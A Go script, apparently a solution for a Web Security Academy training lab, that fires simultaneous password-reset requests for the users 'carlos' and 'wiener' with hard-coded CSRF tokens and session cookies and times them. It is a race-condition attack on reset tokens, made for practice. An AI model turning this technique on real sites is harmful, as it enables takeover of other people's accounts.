package main

import (
	"fmt"
	"net/http"
	"sync"
	"time"
)

var (
	mainUrl = "https://0a8a002403988d77808d6dfa00b70072.web-security-academy.net" // should NOT end with "/"

	httpClient = http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
)

func main() {
	var wg sync.WaitGroup

	// get a home page: something like a connection warming request
	// makeHttpReq(http.MethodGet, mainUrl, "", "", false)

	// for i := 0; i < 2; i++ {
	wg.Add(2)
	go flow(&wg, "carlos", "cBfzOKpxHJ4RwuACKYfzs7Oryx8n6EzT", "phpsessionid=1hSzY8zUJwvUr71fCte6cnL9GSSgTrTR")
	go flow(&wg, "wiener", "JsEfpGGJKzu9XmWXqK73gcw4J3qBiE5o", "phpsessionid=XGkqGg9Emrf6zHF0rjjySevjNOiLIfHZ")
	// }

	wg.Wait()
}

func flow(wg *sync.WaitGroup, user, csrf, cookie string) {
	defer wg.Done()

	start := time.Now()

	makeHttpReq(http.MethodPost, mainUrl+"/forgot-password", "csrf="+csrf+"&username="+user, cookie, false)

	elapsed := time.Since(start).Milliseconds()

	fmt.Println("user: " + user)
	fmt.Println(elapsed)

	// rawHttpLikeOutput(resp)
}
